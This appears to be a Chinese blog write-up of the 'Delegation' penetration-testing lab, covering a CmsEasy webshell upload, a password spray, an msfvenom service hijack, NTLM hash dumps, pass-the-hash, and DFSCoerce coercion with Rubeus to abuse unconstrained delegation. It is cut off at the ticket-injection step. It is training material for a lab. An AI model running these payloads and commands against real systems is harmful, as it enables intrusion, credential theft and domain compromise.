@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wuyaxiao.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"posthide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="春秋云境 Delegation WPDelegation是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。 flag01首先入口，cmseasy的页面。  找到后台&#x2F;admin。弱口令admin 12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜">
+<meta property="og:url" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/index.html">
+<meta property="og:site_name" content="学习小屋">
+<meta property="og:description" content="春秋云境 Delegation WPDelegation是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。 flag01首先入口，cmseasy的页面。  找到后台&#x2F;admin。弱口令admin 12">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260724003311116.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260724003342111.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260723222716546.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260723222950421.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260723223541871.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260723223614449.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260723225554313.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260724011450829.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260725171317181.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260725200612415.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260725203041498.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260725202424709.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181004044-2115879123.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181004844-1038190829.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181005533-1727761370.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181006187-1492507510.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181007382-444903150.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181008617-1330336120.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181009647-1588958915.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181010745-858848198.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181011389-2130673127.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181012299-973840610.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181013350-31666908.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181014104-1162979587.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181014824-1843991263.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181015756-533365461.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181016721-1183614587.png">
+<meta property="article:published_time" content="2026-07-20T10:23:52.210Z">
+<meta property="article:modified_time" content="2026-11-09T06:53:54.641Z">
+<meta property="article:author" content="wuyaxiao">
+<meta property="article:tag" content="无限进行时">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260724003311116.png">
+
+<link rel="canonical" href="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>春秋云镜 | 学习小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">学习小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wuyaxiao.github.io/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wuyaxiao">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习小屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          春秋云镜
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-07-20 18:23:52" itemprop="dateCreated datePublished" datetime="2026-07-20T18:23:52+08:00">2026-07-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-11-09 14:53:54" itemprop="dateModified" datetime="2026-11-09T14:53:54+08:00">2026-11-09</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="春秋云境-Delegation-WP"><a href="#春秋云境-Delegation-WP" class="headerlink" title="春秋云境 Delegation WP"></a>春秋云境 Delegation WP</h2><p>Delegation是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。</p>
+<h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>首先入口，cmseasy的页面。</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260724003311116.png" alt="image-20260724003311116"></p>
+<p>找到后台&#x2F;admin。弱口令admin 123456登录</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260724003342111.png" alt="image-20260724003342111"></p>
+<p>利用CmsEasy 7.3.8 本地文件包含漏洞，发送数据包写马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1</span><br><span class="line">Host: 39.99.132.162</span><br><span class="line">Content-Length: 80</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded;</span><br><span class="line">Cookie: PHPSESSID=cde5pulp6m2siqal2tekfk3eup; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313</span><br><span class="line"></span><br><span class="line">sid=#data_d_.._d_.._d_.._d_2.php&amp;slen=693&amp;scontent=&lt;?php eval($_POST[&quot;test&quot;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260723222716546.png" alt="image-20260723222716546"></p>
+<p>找到flag01，但是没有权限读取</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260723222950421.png" alt="image-20260723222950421"></p>
+<p>查找权限中设置了 SUID位的文件。SUID意味着任何用户执行该文件时，都会以文件<strong>所有者</strong>（通常是root）的权限运行，这是提权的潜在突破口。</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260723223541871.png" alt="image-20260723223541871"></p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260723223614449.png" alt="image-20260723223614449"></p>
+<h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>得到了一个提示：Here is the hint: WIN19\Adrian</p>
+<p>上传fscan并进行扫描</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260723225554313.png" alt="image-20260723225554313"></p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260724011450829.png" alt="image-20260724011450829"></p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260725171317181.png" alt="image-20260725171317181"></p>
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.7 存活 (协议: ICMP)</span><br><span class="line">172.22.4.19 存活 (协议: ICMP)</span><br><span class="line">172.22.4.36 存活 (协议: ICMP)</span><br><span class="line">172.22.4.45 存活 (协议: ICMP)</span><br><span class="line">172.22.4.36:21                 ftp      [Product:vsftpd ||Version:3.0.3]</span><br><span class="line">172.22.4.36:22                 ssh      [Product:OpenSSH ||Version:8.2p1 Ubuntu 4ubuntu0.5]</span><br><span class="line">172.22.4.36:3306               mysql    [Product:Genetec Security Center]</span><br><span class="line">172.22.4.7:389                 ldap     [Product:Microsoft Windows Active Directory LDAP]</span><br><span class="line">172.22.4.45:445                microsoft-ds [Product:Microsoft Windows SMB2]</span><br><span class="line">172.22.4.7:3268                ldap     [Product:Microsoft Windows Active Directory LDAP]</span><br><span class="line">172.22.4.7:445                 microsoft-ds [Product:Microsoft Windows SMB2]</span><br><span class="line">172.22.4.19:445                microsoft-ds [Product:Microsoft Windows SMB2]</span><br><span class="line">172.22.4.7:88                  spark    [Product:Apache Spark]</span><br><span class="line">[+] SMBInfo 172.22.4.45:445 [Windows 10 (Build 17763)] WIN19 SMBv2</span><br><span class="line">[+] SMBInfo 172.22.4.7:445 [Windows 10 (Build 14393)] DC01 SMBv1</span><br><span class="line">[+] SMBInfo 172.22.4.19:445 [Windows 10 (Build 14393)] FILESERVER SMBv1</span><br><span class="line">[+] RDP 172.22.4.45:3389 [Hostname:WIN19, FQDN:WIN19.xiaorang.lab]</span><br><span class="line">[+] RDP 172.22.4.7:3389 [Hostname:DC01, FQDN:DC01.xiaorang.lab]</span><br><span class="line">[+] RDP 172.22.4.19:3389 [Hostname:FILESERVER, FQDN:FILESERVER.xiaorang.lab]</span><br><span class="line">[+] http://172.22.4.45             code:200 len:703   title:IIS Windows Server</span><br><span class="line">[+] http://172.22.4.36             code:200 len:68112 title:中文网页标题</span><br><span class="line">[+] NetInfo 172.22.4.45:135 [WIN19]</span><br><span class="line">[+] NetInfo 172.22.4.7:135 [DC01]</span><br><span class="line">[+] NetInfo 172.22.4.19:135 [FILESERVER]</span><br><span class="line">扫描完成，发现 25 个开放端口</span><br><span class="line">存活主机数: 4</span><br></pre></td></tr></table></figure>
+
+<p>利用frp进行内网穿透</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260725200612415.png" alt="image-20260725200612415"></p>
+<p>点击上传按钮，选择Kali上的 <code>frpc</code> 文件（在 <code>frp_0.52.0_linux_amd64/</code> 目录下）</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hovin/p/18023593#_label4_1">https://www.cnblogs.com/hovin/p/18023593#_label4_1</a></p>
+<p>在蚁剑中配置文件</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260725203041498.png" alt="image-20260725203041498"></p>
+<p>点击上传按钮，选择Kali上的 <code>frpc</code> 文件（在 <code>frp_0.52.0_linux_amd64/</code> 目录下）</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/image-20260725202424709.png" alt="image-20260725202424709"></p>
+<p>因为提示了我们WIN19的一个用户，我们去打172.22.4.45 ，爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加：</span></span><br><span class="line">socks5 127.0.0.1 1080</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用</span></span><br><span class="line">proxychains crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt -d WIN19</span><br></pre></td></tr></table></figure>
+
+<p>爆破结果如下，发现babygirl1和其他的不一样：</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181004044-2115879123.png" alt="image-20240110153420521"></p>
+<p>登陆后发现需要改密码，这里注意要在kail里面远程连接，win下自带的mstsc没有办法进入到修改密码的页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/frpc -c /tmp/frpc.toml</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 172.22.4.45</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181004844-1038190829.png" alt="image-20240110153819194"></p>
+<p>更改密码1q2w3e4r，然后成功登录，在桌面发现后门，把生成的html文件看一下</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181005533-1727761370.png" alt="image-20240110154248181"></p>
+<p>发现可以修改注册表gupdate</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181006187-1492507510.png" alt="image-20240110161515183"></p>
+<p>我们接下来用msf生成一个正向连接的木马，让后让注册表关联gupdate，然后再重新启动服务即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp LPORT=3344 -f exe &gt; aaa.exe</span><br><span class="line"></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Services\gupdate /v ImagePath /t REG_EXPAND_SZ /d <span class="string">&quot;C:\Users\Adrian\Desktop\aaa.exe&quot;</span></span><br><span class="line"></span><br><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure>
+
+<p>但是session的存活时间很短，所以要迁移进程，如下图已经是system权限，成功读取flag</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181007382-444903150.png" alt="image-20240110163601932"></p>
+<h2 id="flag03和flag04"><a href="#flag03和flag04" class="headerlink" title="flag03和flag04"></a>flag03和flag04</h2><p>hashdump获取hash：</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181008617-1330336120.png" alt="image-20240113170459678"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::</span><br><span class="line">Adrian:1003:aad3b435b51404eeaad3b435b51404ee:68365827d79c4f5cc9b52b688495fd51:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::</span><br></pre></td></tr></table></figure>
+
+<p>我们再load kiwi ，creds_all 一下，获得机器用户的hash，因为机器用户都是域内用户，在后续需要用到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Username  Domain    NTLM                              SHA1</span><br><span class="line">--------  ------    ----                              ----</span><br><span class="line">Adrian    WIN19     68365827d79c4f5cc9b52b688495fd51  41ab23d1abfc618a7c05ee1a45f999799357f4dc</span><br><span class="line">WIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b76399d26f39b8f8</span><br><span class="line">WIN19$    XIAORANG  4017dab3eeaf981160632f84bbf00f73  4db8ab97ee5e004b173d8b5072399f8b0cee523d</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们先psexec连接上172.22.4.45，创建一个新用户并加到管理员组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python psexec.py Administrator@172.22.4.45 -hashes :ba21c629d9fd56aff10c3e826323e6ab -codec gbk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181009647-1588958915.png" alt="image-20240113171213023"></p>
+<p>利用工具<a target="_blank" rel="noopener" href="https://github.com/lzzbb/Adinfo">lzzbb&#x2F;Adinfo: 域信息收集工具 (github.com)</a>进行信息收集。</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181010745-858848198.png" alt="image-20240113172005761"></p>
+<p>发现一个非约束委派,，那么只要域控来访问我们的服务，就会在我们本地的lsass进程中缓存目标的TGT。</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181011389-2130673127.png" alt="image-20240113172103320"></p>
+<p>上传一个Rubeus，准备进行抓取票据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br></pre></td></tr></table></figure>
+
+<p>用dfscoerce触发rpc使dc向WIN19认证，这里接收端使用ip的时候成功率不高</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python dfscoerce.py -u &quot;WIN19$&quot; -hashes :5943c35371c96f19bda7b8e67d041727 -d xiaorang.lab win19 172.22.4.7</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181012299-973840610.png" alt="image-20240113172708283"></p>
+<p>成功获取票据</p>
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181013350-31666908.png" alt="image-20240113172726025"></p>
+<p>票据注入，命令如下</p>
